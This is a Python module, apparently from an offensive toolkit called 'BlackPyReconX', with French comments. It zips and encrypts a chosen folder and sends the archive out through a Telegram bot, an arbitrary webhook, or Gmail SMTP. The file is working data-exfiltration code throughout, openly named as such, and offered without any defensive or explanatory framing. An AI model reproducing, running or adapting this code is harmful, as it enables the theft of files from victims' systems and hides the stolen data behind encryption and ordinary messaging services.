import os
import zipfile
import smtplib
import requests
from pathlib import Path
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from cryptography.fernet import Fernet

from modules.utils import get_api_keys

# === Chargement des clés depuis .env
api = get_api_keys()
FERNET_KEY = api.get("FERNET_KEY")
TELEGRAM_TOKEN = api.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = api.get("TELEGRAM_CHAT_ID")
WEBHOOK_URL = api.get("WEBHOOK_URL")
EMAIL_USER = api.get("EMAIL_SENDER")
EMAIL_PASS = api.get("EMAIL_PASSWORD")
EMAIL_TO = api.get("EMAIL_TO")

# === Dossiers
BASE_DIR = Path(__file__).resolve().parent.parent
OUTPUTS = BASE_DIR / "outputs"
OUTPUTS.mkdir(parents=True, exist_ok=True)

def zip_and_encrypt(source_folder, output_zip=OUTPUTS / "exfiltrated.zip", encrypted_output=OUTPUTS / "exfiltrated.enc"):
    """Zippe et chiffre un dossier avec Fernet"""
    try:
        with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(source_folder):
                for file in files:
                    path = os.path.join(root, file)
                    arcname = os.path.relpath(path, source_folder)
                    zipf.write(path, arcname)

        with open(output_zip, 'rb') as file:
            data = file.read()

        fernet = Fernet(FERNET_KEY)
        encrypted_data = fernet.encrypt(data)

        with open(encrypted_output, 'wb') as enc_file:
            enc_file.write(encrypted_data)

        print(f"✅ Dossier zippé et chiffré : {encrypted_output}")
        return encrypted_output

    except Exception as e:
        print(f"❌ Erreur zip/encrypt : {e}")

def exfiltrate_via_telegram(file_path):
    """Exfiltre un fichier via API Telegram Bot"""
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        print("[!] Config Telegram manquante dans .env")
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': "📤 Exfiltration terminée via Telegram"}
            requests.post(url, data=data, files=files, timeout=10)
        print("📦 Fichier envoyé à Telegram avec succès")
    except Exception as e:
        print(f"❌ Erreur Telegram : {e}")

def exfiltrate_via_webhook(file_path):
    """Exfiltre un fichier via webhook (custom backend, Discord, etc.)"""
    if not WEBHOOK_URL:
        print("[!] URL de webhook manquante")
        return
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            requests.post(WEBHOOK_URL, files=files, timeout=10)
        print("📡 Fichier envoyé via webhook")
    except Exception as e:
        print(f"❌ Erreur Webhook : {e}")

def exfiltrate_via_email(file_path):
    """Exfiltration par email via SMTP sécurisé"""
    if not EMAIL_USER or not EMAIL_PASS or not EMAIL_TO:
        print("[!] Configuration email incomplète")
        return
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_USER
        msg['To'] = EMAIL_TO
        msg['Subject'] = "📤 Exfiltration - BlackPyReconX"

        part = MIMEBase('application', "octet-stream")
        with open(file_path, 'rb') as f:
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{file_path.name}"')
        msg.attach(part)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_USER, EMAIL_PASS)
            server.send_message(msg)
        print("📧 Fichier envoyé par email")
    except Exception as e:
        print(f"❌ Erreur Email : {e}")

def exfiltrate_all():
    """Exfiltration complète du dossier outputs"""
    enc_file = zip_and_encrypt(OUTPUTS)
    if enc_file:
        exfiltrate_via_telegram(enc_file)
        exfiltrate_via_webhook(enc_file)
        # exfiltrate_via_email(enc_file)  # à activer si souhaité

def exfiltrate_path(target_path):
    """Exfiltration ciblée d’un dossier personnalisé"""
    target_path = Path(target_path)
    if not target_path.exists():
        print(f"[!] Chemin invalide : {target_path}")
        return
    enc_file = zip_and_encrypt(
        target_path,
        output_zip=OUTPUTS / "custom.zip",
        encrypted_output=OUTPUTS / "custom.enc"
    )
    if enc_file:
        exfiltrate_via_telegram(enc_file)
        exfiltrate_via_webhook(enc_file)
